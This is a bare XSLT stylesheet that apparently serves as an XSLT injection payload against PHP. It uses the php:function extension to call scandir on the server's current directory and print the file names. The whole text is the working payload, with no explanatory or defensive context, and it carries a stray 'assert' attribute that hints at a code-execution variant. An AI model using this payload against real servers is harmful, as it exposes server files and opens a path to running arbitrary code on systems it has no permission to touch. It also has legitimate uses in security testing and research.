<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:for-each name="assert" select="php:function('scandir', '.')">
<li><xsl:value-of select="."/></li>
</xsl:for-each>
</xsl:template>
</xsl:stylesheet>
